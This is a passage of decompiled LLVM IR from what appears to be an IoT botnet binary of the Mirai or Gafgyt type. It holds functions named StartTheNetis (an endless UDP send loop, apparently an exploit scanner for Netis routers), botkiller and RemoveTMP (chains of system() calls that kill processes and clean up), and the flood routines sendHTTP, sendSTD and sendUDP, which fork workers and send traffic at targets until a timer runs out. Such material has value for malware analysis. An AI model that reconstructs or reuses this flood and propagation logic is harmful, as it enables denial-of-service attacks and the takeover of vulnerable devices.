  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 10, 12, 13, 11, 14, 15, 17, 18, 16, 19, 20, 9, 21, 22, 23, 24, 26, 25, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 54, 53, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 84, 85, 86, 87, 88, 89, 90, 91, 92, 83, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106 }
  uselistorder i32* %eax.global-to-local, { 1, 4, 2, 3, 6, 7, 5, 8, 9, 10, 11, 12, 15, 13, 14, 16, 18, 20, 19, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 17, 31, 32, 33, 34, 35, 37, 36, 38, 39, 41, 40, 42, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 57, 55, 56, 59, 60, 61, 58, 62, 63, 64, 66, 65, 67, 68, 70, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 82, 80, 81, 84, 85, 86, 83, 87, 88, 89, 90, 91, 92, 95, 93, 94, 97, 98, 96, 99, 100, 101, 102, 103, 104, 105, 108, 106, 107, 109, 110, 112, 111, 113, 114, 115, 116, 118, 117, 119, 120, 121, 122, 123, 126, 124, 125, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 145, 160, 161, 162, 163, 164, 165, 166, 0, 179, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 186, 180, 181, 182, 183, 185, 184 }
  uselistorder i32 ()* @get_telstate_host, { 1, 0 }
  uselistorder i32 ()* @contains_fail, { 2, 1, 0 }
  uselistorder i32 (i32)* @read_until_response, { 2, 1, 0 }
  uselistorder i32 (i32)* @sclose, { 4, 3, 2, 1, 0 }
  uselistorder i8 7, { 1, 2, 0 }
  uselistorder i8 5, { 1, 0 }
  uselistorder i32 5000, { 1, 0 }
  uselistorder label %dec_label_pc_804e324, { 33, 1, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 3, 17, 18, 19, 20, 21, 22, 4, 23, 24, 25, 5, 26, 27, 28, 29, 30, 6, 31, 32, 0 }
  uselistorder label %dec_label_pc_804d1c0, { 1, 0 }
  uselistorder label %dec_label_pc_804d172, { 1, 0 }
  uselistorder label %dec_label_pc_804d0de, { 1, 0 }
}

define i32 @StartTheNetis() local_unnamed_addr {
entry:
  %stack_var_-1072 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v2_804e389 = ptrtoint i32* %stack_var_-48 to i32
  %v2_804e3b3 = ptrtoint i32* %stack_var_-1072 to i32
  %v4_804e3d8 = bitcast i32* %stack_var_-1072 to i8*
  br label %dec_label_pc_804e343

dec_label_pc_804e343:                             ; preds = %dec_label_pc_804e343, %entry
  %v5_804e35a = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 %v5_804e35a, i32* @eax, align 4
  %v1_804e362 = call i32 @NetisRanges(i32 %v5_804e35a)
  store i32 2, i32* %stack_var_-48, align 4
  %v2_804e377 = call i32 @htons(i16 -12123)
  %v3_804e3bc = call i32 @sprintf(i32 %v2_804e3b3, i32 ptrtoint ([327 x i8]* @global_var_8059bd0.255 to i32))
  store i32 %v2_804e389, i32* @ebx, align 4
  %v3_804e3de = call i32 @_strlen(i8* %v4_804e3d8)
  %v8_804e40e = call i32 @__libc_sendto(i32 %v5_804e35a, i32 %v2_804e3b3, i32 %v3_804e3de, i32 0, i32 %v2_804e389, i32 16)
  br label %dec_label_pc_804e343
}

define i32 @LoopPayload() local_unnamed_addr {
entry:
  %v2_804e432 = call i32 @__libc_system(i32 ptrtoint ([320 x i8]* @global_var_8059d18.256 to i32))
  ret i32 %v2_804e432
}

define i32 @botkiller() local_unnamed_addr {
entry:
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-384 = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e44a = load i32, i32* @edi, align 4
  %v0_804e44b = load i32, i32* @esi, align 4
  %v0_804e44c = load i32, i32* @ebx, align 4
  store i32 %v0_804e44c, i32* %stack_var_-16, align 4
  %tmp23 = bitcast i32* %stack_var_-68 to i8*
  store i32 ptrtoint ([9 x i8*]* @global_var_805a040.266 to i32), i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_804e463 = call i8* @_memcpy(i8* %tmp23, i8* bitcast ([9 x i8*]* @global_var_805a040.266 to i8*), i32 10)
  %v5_804e480 = bitcast i32* %stack_var_-160 to i16*
  %v6_804e480 = call i32 @memcpy(i16* %v5_804e480, i32 ptrtoint ([23 x i8*]* @global_var_8059f80.289 to i32), i32 92)
  %v2_804e485 = ptrtoint i32* %stack_var_-224 to i32
  %tmp24 = bitcast i32* %stack_var_-224 to i8*
  store i32 %v2_804e485, i32* @edi, align 4
  store i32 ptrtoint ([16 x i8*]* @global_var_8059ee0.299 to i32), i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_804e49b = call i8* @_memcpy(i8* %tmp24, i8* bitcast ([16 x i8*]* @global_var_8059ee0.299 to i8*), i32 16)
  %v5_804e4aa = icmp sgt i32 %tmp8, 0
  br i1 %v5_804e4aa, label %dec_label_pc_804e4b0, label %dec_label_pc_804e5b2

dec_label_pc_804e4b0:                             ; preds = %entry
  %v2_804e4b0 = ptrtoint i32* %stack_var_-512 to i32
  %v5_804e4cc = bitcast i32* %stack_var_-512 to i8*
  %v6_804e4cc = call i32 @__GI_memset(i8* %v5_804e4cc, i32 0, i32 128)
  %v0_804e534 = load i32, i32* @ebp, align 4
  %v4_804e4e4 = add i32 %v0_804e534, -64
  %v5_804e4e4 = inttoptr i32 %v4_804e4e4 to i32*
  %v6_804e4eb = load i32, i32* %v5_804e4e4, align 4
  store i32 %v6_804e4eb, i32* @ebx, align 4
  %v6_804e4f2 = load i32, i32* %v5_804e4e4, align 4
  store i32 %v6_804e4f2, i32* @esi, align 4
  %v6_804e4f9 = load i32, i32* %v5_804e4e4, align 4
  %v8_804e52a = call i32 @__GI_snprintf(i32 %v2_804e4b0, i32 127, i32 ptrtoint ([100 x i8]* @global_var_805a068.300 to i32), i32 %v6_804e4f9, i32 %v6_804e4f2, i32 %v6_804e4eb)
  %v1_804e579 = call i32 @__libc_system(i32 %v2_804e4b0)
  %v2_804e594 = ptrtoint i32* %stack_var_-384 to i32
  %v3_804e59d = call i32 @sprintf(i32 %v2_804e594, i32 ptrtoint ([14 x i8]* @global_var_805a0e9.302 to i32))
  %v1_804e5ab = call i32 @__libc_system(i32 %v2_804e594)
  br label %dec_label_pc_804e5be

dec_label_pc_804e5b2:                             ; preds = %entry
  %v1_804e5b9 = call i32 @sleep(i32 5)
  br label %dec_label_pc_804e5be

dec_label_pc_804e5be:                             ; preds = %dec_label_pc_804e4b0, %dec_label_pc_804e5b2
  %storemerge3 = phi i32 [ %v1_804e5b9, %dec_label_pc_804e5b2 ], [ %v1_804e5ab, %dec_label_pc_804e4b0 ]
  %v2_804e5c4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e5c4, i32* @ebx, align 4
  store i32 %v0_804e44b, i32* @esi, align 4
  store i32 %v0_804e44a, i32* @edi, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32* %v5_804e4e4, { 0, 2, 1 }
  uselistorder i32 %v2_804e4b0, { 1, 0 }
  uselistorder label %dec_label_pc_804e5be, { 1, 0 }
}

define i32 @RemoveTMP() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804e5c9 = load i32, i32* @ebp, align 4
  store i32 %v0_804e5c9, i32* %stack_var_-4, align 4
  %v2_804e5d6 = call i32 @__libc_system(i32 ptrtoint ([43 x i8]* @global_var_805a0f8.303 to i32))
  %v2_804e5e2 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_805a123.304 to i32))
  %v2_804e5ee = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_805a138.305 to i32))
  %v2_804e5fa = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_805a123.304 to i32))
  %v2_804e606 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_805a14e.306 to i32))
  %v2_804e612 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_805a15c.307 to i32))
  %v2_804e61e = call i32 @__libc_system(i32 ptrtoint ([23 x i8]* @global_var_805a167.308 to i32))
  %v2_804e62a = call i32 @__libc_system(i32 ptrtoint ([20 x i8]* @global_var_805a17e.309 to i32))
  %v2_804e636 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_805a192.310 to i32))
  %v2_804e642 = call i32 @__libc_system(i32 ptrtoint ([17 x i8]* @global_var_805a19d.311 to i32))
  %v2_804e64e = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_805a1ae.312 to i32))
  %v2_804e65a = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_805a1bc.313 to i32))
  %v2_804e666 = call i32 @__libc_system(i32 ptrtoint ([36 x i8]* @global_var_805a1d4.314 to i32))
  %v2_804e66b = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e66b, i32* @ebp, align 4
  ret i32 %v2_804e666

; uselistorder directives
  uselistorder i32 (i32)* @__libc_system, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e66d = load i32, i32* @ebp, align 4
  store i32 %v0_804e66d, i32* %stack_var_-4, align 4
  %v4_804e66d = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804e66d, i32* @ebp, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_804e687 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_804e68f = icmp eq i32 %v1_804e687, 0
  %v1_804e693 = icmp eq i1 %v4_804e68f, false
  br i1 %v1_804e693, label %dec_label_pc_804e6a1, label %dec_label_pc_804e766

dec_label_pc_804e6a1:                             ; preds = %entry
  %v1_804e6a4 = add i32 %v1_804e687, 12
  %v2_804e6a4 = inttoptr i32 %v1_804e6a4 to i32*
  %v3_804e6a4 = load i32, i32* %v2_804e6a4, align 4
  %v1_804e6ac = add i32 %v1_804e687, 16
  %v2_804e6ac = inttoptr i32 %v1_804e6ac to i32*
  %v3_804e6ac = load i32, i32* %v2_804e6ac, align 4
  %v1_804e6af = inttoptr i32 %v3_804e6ac to i32*
  %v2_804e6af = load i32, i32* %v1_804e6af, align 4
  %v15_804e6b8 = ptrtoint i32* %stack_var_-24 to i32
  %v3_804e6c2 = call i32 @bcopy(i32 %v2_804e6af, i32 %v15_804e6b8, i32 %v3_804e6a4)
  %v2_804e6ce = call i32 @htons(i16 %arg2)
  store i32 2, i32* %stack_var_-28, align 4
  %v3_804e6f7 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_804e6ff = ptrtoint i32* %stack_var_-32 to i32
  %v5_804e724 = call i32 @__GI_setsockopt(i32 %v3_804e6f7, i32 6, i32 1, i32 %v2_804e6ff, i32 4)
  %v13_804e729 = icmp eq i32 %v3_804e6f7, -1
  %v1_804e72d = icmp eq i1 %v13_804e729, false
  br i1 %v1_804e72d, label %dec_label_pc_804e738, label %dec_label_pc_804e766

dec_label_pc_804e738:                             ; preds = %dec_label_pc_804e6a1
  %v2_804e6b5 = ptrtoint i32* %stack_var_-28 to i32
  %v3_804e74d = call i32 @__libc_connect(i32 %v3_804e6f7, i32 %v2_804e6b5, i32 16)
  %v10_804e752 = icmp eq i32 %v3_804e74d, -1
  %v1_804e755 = icmp eq i1 %v10_804e752, false
  br i1 %v1_804e755, label %dec_label_pc_804e760, label %dec_label_pc_804e766

dec_label_pc_804e760:                             ; preds = %dec_label_pc_804e738
  br label %dec_label_pc_804e766

dec_label_pc_804e766:                             ; preds = %dec_label_pc_804e738, %dec_label_pc_804e6a1, %entry, %dec_label_pc_804e760
  %stack_var_-44.0 = phi i32 [ %v3_804e6f7, %dec_label_pc_804e760 ], [ 0, %entry ], [ 0, %dec_label_pc_804e6a1 ], [ 0, %dec_label_pc_804e738 ]
  %v2_804e769 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e769, i32* @ebp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %v3_804e6f7, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_804e766, { 3, 0, 1, 2 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-796 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804e76f = load i32, i32* @ebx, align 4
  store i32 %v0_804e76f, i32* %stack_var_-12, align 4
  %v4_804e79b = bitcast i32* %stack_var_-272 to i16*
  %v5_804e79b = call i32 @memcpy(i16* %v4_804e79b, i32 ptrtoint ([62 x i8*]* @global_var_805b560.377 to i32), i32 248)
  %v2_804e7c5 = call i32 @__GI_time(i32* null)
  %v5_804e7ca = add i32 %v2_804e7c5, %arg5
  store i32 %v5_804e7ca, i32* @eax, align 4
  %v1_804e7d0 = call i32 @random()
  %v2_804e7f3 = srem i32 %v1_804e7d0, 65
  store i32 %v2_804e7f3, i32* @eax, align 4
  %v0_804e81a = load i32, i32* @ebp, align 4
  %v2_804e81a = mul nsw i32 %v2_804e7f3, 4
  %v3_804e81a = add i32 %v2_804e81a, -268
  %v4_804e81a = add i32 %v3_804e81a, %v0_804e81a
  %v5_804e81a = inttoptr i32 %v4_804e81a to i32*
  %v6_804e81a = load i32, i32* %v5_804e81a, align 4
  store i32 %v6_804e81a, i32* @ebx, align 4
  %v1_804e821 = call i32 @random()
  %v2_804e84f = srem i32 %v1_804e821, 3
  store i32 %v2_804e84f, i32* @edi, align 4
  %v2_804e89e = ptrtoint i32* %stack_var_-796 to i32
  %v3_804e8a7 = call i32 @sprintf(i32 %v2_804e89e, i32 ptrtoint ([62 x i8]* @global_var_805b670.381 to i32))
  %v5_804e95143 = icmp sgt i32 %arg6, 0
  br i1 %v5_804e95143, label %dec_label_pc_804e8b8, label %dec_label_pc_804e957

dec_label_pc_804e8b8:                             ; preds = %entry, %dec_label_pc_804e948
  %storemerge44 = phi i32 [ %v4_804e948, %dec_label_pc_804e948 ], [ 0, %entry ]
  %v1_804e8b8 = call i32 @__libc_fork(i32 %storemerge44)
  %v1_804e8bd = icmp eq i32 %v1_804e8b8, 0
  br i1 %v1_804e8bd, label %dec_label_pc_804e948, label %dec_label_pc_804e92b.preheader

dec_label_pc_804e92b.preheader:                   ; preds = %dec_label_pc_804e8b8
  %v4_804e8fa = bitcast i32* %stack_var_-796 to i8*
  br label %dec_label_pc_804e92b

dec_label_pc_804e8c7:                             ; preds = %dec_label_pc_804e92b
  store i32 %arg1, i32* @edx, align 4
  %v4_804e8d8 = call i32 @socket_connect(i32 %arg1, i16 %arg3)
  %v4_804e8e0 = icmp eq i32 %v4_804e8d8, 0
  br i1 %v4_804e8e0, label %dec_label_pc_804e92b, label %dec_label_pc_804e8e6

dec_label_pc_804e8e6:                             ; preds = %dec_label_pc_804e8c7
  store i1 false, i1* @df, align 1
  store i32 %v2_804e89e, i32* @edi, align 4
  %v3_804e900 = call i32 @_strlen(i8* %v4_804e8fa)
  %v5_804e91b = call i32 @__libc_write(i32 %v4_804e8d8, i32* nonnull %stack_var_-796, i32 %v3_804e900)
  %v1_804e926 = call i32 @__libc_close(i32 %v4_804e8d8)
  br label %dec_label_pc_804e92b

dec_label_pc_804e92b:                             ; preds = %dec_label_pc_804e8c7, %dec_label_pc_804e8e6, %dec_label_pc_804e92b.preheader
  %v2_804e932 = call i32 @__GI_time(i32* null)
  %v5_804e93a = icmp slt i32 %v2_804e932, %v5_804e7ca
  br i1 %v5_804e93a, label %dec_label_pc_804e8c7, label %dec_label_pc_804e93c

dec_label_pc_804e93c:                             ; preds = %dec_label_pc_804e92b
  %v1_804e943 = call i32 @__GI__exit(i32 1)
  unreachable

dec_label_pc_804e948:                             ; preds = %dec_label_pc_804e8b8
  %v4_804e948 = add nuw nsw i32 %storemerge44, 1
  %v5_804e951 = icmp slt i32 %v4_804e948, %arg6
  br i1 %v5_804e951, label %dec_label_pc_804e8b8, label %dec_label_pc_804e957

dec_label_pc_804e957:                             ; preds = %dec_label_pc_804e948, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %v4_804e948, %dec_label_pc_804e948 ]
  %v2_804e95d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e95d, i32* @ebx, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_804e948, { 0, 2, 1 }
  uselistorder i32 %v4_804e8d8, { 1, 0, 2 }
  uselistorder i32 %storemerge44, { 1, 0 }
  uselistorder i32 %v2_804e7f3, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804e92b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e8b8, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e961 = load i32, i32* @ebp, align 4
  store i32 %v0_804e961, i32* %stack_var_-4, align 4
  %v4_804e961 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804e961, i32* @ebp, align 4
  %v4_804e981 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_804e990 = call i32 @__GI_time(i32* null)
  %v1_804e99e = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_804e9a6 = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_804e9c7 = add i32 %v1_804e99e, 12
  %v2_804e9c7 = inttoptr i32 %v1_804e9c7 to i32*
  %v3_804e9c7 = load i32, i32* %v2_804e9c7, align 4
  %v2_804e9cf = ptrtoint i32* %stack_var_-36 to i32
  %v1_804e9d5 = add i32 %v1_804e99e, 16
  %v2_804e9d5 = inttoptr i32 %v1_804e9d5 to i32*
  %v3_804e9d5 = load i32, i32* %v2_804e9d5, align 4
  %v1_804e9d8 = inttoptr i32 %v3_804e9d5 to i32*
  %v2_804e9d8 = load i32, i32* %v1_804e9d8, align 4
  %v4_804e9e5 = call i32 @bcopy(i32 %v2_804e9d8, i32 %v2_804e9cf, i32 %v3_804e9c7)
  %v1_804e9ed = add i32 %v1_804e99e, 8
  %v2_804e9ed = inttoptr i32 %v1_804e9ed to i32*
  %v3_804e9ed = load i32, i32* %v2_804e9ed, align 4
  %v1_804e9f0 = urem i32 %v3_804e9ed, 65536
  store i32 %v1_804e9f0, i32* %stack_var_-40, align 4
  %v4_804ea23 = bitcast i32* %stack_var_-184 to i16*
  %v5_804eacb = add i32 %v2_804e990, %arg3
  br label %dec_label_pc_804ea08

dec_label_pc_804ea08:                             ; preds = %dec_label_pc_804eaf0, %entry
  %storemerge = phi i32 [ %v4_804eaf0, %dec_label_pc_804eaf0 ], [ 0, %entry ]
  %v5_804ea23 = call i32 @memcpy(i16* %v4_804ea23, i32 ptrtoint ([36 x i8*]* @global_var_805b840.418 to i32), i32 144)
  store i32 %v5_804ea23, i32* @eax, align 4
  %v0_804ea28 = call i32 @random()
  %tmp = icmp ult i32 %storemerge, 50
  br i1 %tmp, label %dec_label_pc_804eaf0, label %dec_label_pc_804ea7e

dec_label_pc_804ea7e:                             ; preds = %dec_label_pc_804ea08
  %v0_804ea6e = load i32, i32* @ebp, align 4
  %v3_804ea6e = add i32 %v0_804ea6e, -180
  %v2_804ea43 = udiv i32 %v0_804ea28, 36
  %tmp29 = mul nsw i32 %v2_804ea43, -4
  %v2_804ea60 = add i32 %v0_804ea28, %tmp29
  %v2_804ea6e = mul i32 %v2_804ea60, 4
  %v4_804ea6e = add i32 %v3_804ea6e, %v2_804ea6e
  %v5_804ea6e = inttoptr i32 %v4_804ea6e to i32*
  %v6_804ea6e = load i32, i32* %v5_804ea6e, align 4
  %v5_804ea9b = call i32 @__libc_send(i32 %v4_804e981, i32 %v6_804ea6e, i32 75, i32 0)
  %v4_804eab5 = call i32 @__libc_connect(i32 %v4_804e981, i32 %v2_804e9a6, i32 16)
  %v2_804eac1 = call i32 @__GI_time(i32* null)
  %v5_804ead0 = icmp slt i32 %v2_804eac1, %v5_804eacb
  br i1 %v5_804ead0, label %dec_label_pc_804eaf0, label %dec_label_pc_804ead2

dec_label_pc_804ead2:                             ; preds = %dec_label_pc_804ea7e
  %v1_804ead8 = call i32 @__libc_close(i32 %v4_804e981)
  %v1_804eae4 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804eaf0:                             ; preds = %dec_label_pc_804ea7e, %dec_label_pc_804ea08
  %stack_var_-12.0 = phi i32 [ %storemerge, %dec_label_pc_804ea08 ], [ 0, %dec_label_pc_804ea7e ]
  %v4_804eaf0 = add i32 %stack_var_-12.0, 1
  br label %dec_label_pc_804ea08

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_804e99e, { 1, 0, 2 }
  uselistorder i32 %v4_804e981, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32 144, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 2, 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_4()
  %tmp25 = call i16 @__decompiler_undefined_function_4()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-140 = alloca i8*, align 4
  %v0_804eafc = load i32, i32* @ebx, align 4
  %v13_804eafd = ptrtoint i8** %stack_var_-140 to i32
  store i32 2, i32* %stack_var_-68, align 4
  %v4_804eb06 = icmp eq i32 %arg2, 0
  %v1_804eb0a = icmp eq i1 %v4_804eb06, false
  br i1 %v1_804eb0a, label %dec_label_pc_804eb1a, label %dec_label_pc_804eb0c

dec_label_pc_804eb0c:                             ; preds = %entry
  %v1_804eb0c = call i32 @rand_cmwc(i32 2)
  br label %dec_label_pc_804eb2f

dec_label_pc_804eb1a:                             ; preds = %entry
  %v1_804eb1d = urem i32 %arg2, 65536
  store i32 %v1_804eb1d, i32* %eax.global-to-local, align 4
  %v4_804eb20 = inttoptr i32 %v1_804eb1d to i8*
  store i8* %v4_804eb20, i8** %stack_var_-140, align 4
  %v2_804eb23 = trunc i32 %arg2 to i16
  %v3_804eb23 = call i32 @htons(i16 %v2_804eb23)
  br label %dec_label_pc_804eb2f

dec_label_pc_804eb2f:                             ; preds = %dec_label_pc_804eb0c, %dec_label_pc_804eb1a
  %v2_804eb2f = ptrtoint i32* %stack_var_-68 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_804eb3c = inttoptr i32 %arg1 to i8*
  store i8* %v4_804eb3c, i8** %stack_var_-140, align 4
  %v5_804eb3f = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v5_804eb3f, i32* %eax.global-to-local, align 4
  %v1_804eb44 = icmp eq i32 %v5_804eb3f, 0
  %v1_804eb46 = icmp eq i1 %v1_804eb44, false
  br i1 %v1_804eb46, label %dec_label_pc_804ef8c, label %dec_label_pc_804eb4c

dec_label_pc_804eb4c:                             ; preds = %dec_label_pc_804eb2f
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v9_804eb65 = icmp eq i32 %arg4, 32
  %v1_804eb69 = icmp eq i1 %v9_804eb65, false
  br i1 %v1_804eb69, label %dec_label_pc_804ec73, label %dec_label_pc_804eb6f

dec_label_pc_804eb6f:                             ; preds = %dec_label_pc_804eb4c
  store i8* inttoptr (i32 2 to i8*), i8** %stack_var_-140, align 4
  %v5_804eb86 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v5_804eb86, i32* %eax.global-to-local, align 4
  %v4_804eb8e = icmp eq i32 %v5_804eb86, 0
  %v1_804eb92 = icmp eq i1 %v4_804eb8e, false
  br i1 %v1_804eb92, label %dec_label_pc_804ebae, label %dec_label_pc_804eb94

dec_label_pc_804eb94:                             ; preds = %dec_label_pc_804eb6f
  %v0_804eb94 = load i8*, i8** @global_var_805e480.20, align 4
  %v1_804eb94 = ptrtoint i8* %v0_804eb94 to i32
  store i32 %v1_804eb94, i32* %eax.global-to-local, align 4
  store i8* %v0_804eb94, i8** %stack_var_-140, align 4
  %v4_804eba4 = call i32 @HackerPrint(i32 %v1_804eb94, i32 ptrtoint ([27 x i8]* @global_var_805b8d0.419 to i32))
  store i32 %v4_804eba4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ef8c

dec_label_pc_804ebae:                             ; preds = %dec_label_pc_804eb6f
  %v1_804ebb1 = add i32 %arg5, 1
  store i32 %v1_804ebb1, i32* %eax.global-to-local, align 4
  %v4_804ebb2 = inttoptr i32 %v1_804ebb1 to i8*
  store i8* %v4_804ebb2, i8** %stack_var_-140, align 4
  %v2_804ebb5 = call i32 @malloc(i32 %v1_804ebb1)
  store i32 %v2_804ebb5, i32* %eax.global-to-local, align 4
  %v4_804ebbd = icmp eq i32 %v2_804ebb5, 0
  br i1 %v4_804ebbd, label %dec_label_pc_804ef8c, label %dec_label_pc_804ebc7

dec_label_pc_804ebc7:                             ; preds = %dec_label_pc_804ebae
  store i32 %v1_804ebb1, i32* %edx.global-to-local, align 4
  %v1_804ebd0 = inttoptr i32 %v2_804ebb5 to i8*
  store i32 %v2_804ebb5, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804ebd5 = and i32 %v2_804ebb5, -256
  store i32 %v1_804ebd5, i32* %eax.global-to-local, align 4
  %v5_804ebd7 = call i8* @_memset(i8* %v1_804ebd0, i32 %v1_804ebd5, i32 %v1_804ebb1)
  store i32 %v2_804ebb5, i32* %eax.global-to-local, align 4
  store i8* %v1_804ebd0, i8** %stack_var_-140, align 4
  %v5_804ebe6 = call i32 @makeRandomStr(i8* %v1_804ebd0, i32 %arg5)
  store i32 %v5_804ebe6, i32* %eax.global-to-local, align 4
  store i8* null, i8** %stack_var_-140, align 4
  %v3_804ebf2 = call i32 @__GI_time(i32* null)
  %v5_804ebf7 = add i32 %v3_804ebf2, %arg3
  store i32 %v5_804ebf7, i32* %eax.global-to-local, align 4
  %v4_804ec2e = inttoptr i32 %v5_804eb86 to i8*
  br label %dec_label_pc_804ec06

dec_label_pc_804ec06:                             ; preds = %dec_label_pc_804ec50, %dec_label_pc_804ec6e, %dec_label_pc_804ebc7
  %stack_var_-84.0 = phi i32 [ 0, %dec_label_pc_804ebc7 ], [ %v4_804ec6e, %dec_label_pc_804ec6e ], [ 0, %dec_label_pc_804ec50 ]
  store i32 %arg5, i32* %edx.global-to-local, align 4
  store i32 %v5_804eb86, i32* %eax.global-to-local, align 4
  store i8* %v4_804ec2e, i8** %stack_var_-140, align 4
  %v8_804ec31 = call i32 @__libc_sendto(i32 %v5_804eb86, i32 %v2_804ebb5, i32 %arg5, i32 0, i32 %v2_804eb2f, i32 16)
  store i32 %v8_804ec31, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v15_804ec39 = icmp eq i32 %stack_var_-84.0, %arg6
  %v1_804ec3c = icmp eq i1 %v15_804ec39, false
  br i1 %v1_804ec3c, label %dec_label_pc_804ec6e, label %dec_label_pc_804ec3e

dec_label_pc_804ec3e:                             ; preds = %dec_label_pc_804ec06
  br i1 %v1_804eb0a, label %dec_label_pc_804ec50, label %dec_label_pc_804ec44

dec_label_pc_804ec44:                             ; preds = %dec_label_pc_804ec3e
  %v0_804ec44 = load i8*, i8** %stack_var_-140, align 4
  %v1_804ec44 = ptrtoint i8* %v0_804ec44 to i32
  %v2_804ec44 = call i32 @rand_cmwc(i32 %v1_804ec44)
  %v1_804ec49 = urem i32 %v2_804ec44, 65536
  store i32 %v1_804ec49, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ec50

dec_label_pc_804ec50:                             ; preds = %dec_label_pc_804ec3e, %dec_label_pc_804ec44
  store i8* null, i8** %stack_var_-140, align 4
  %v3_804ec57 = call i32 @__GI_time(i32* null)
  store i32 %v3_804ec57, i32* %eax.global-to-local, align 4
  %v8_804ec5f = icmp sgt i32 %v3_804ec57, %v5_804ebf7
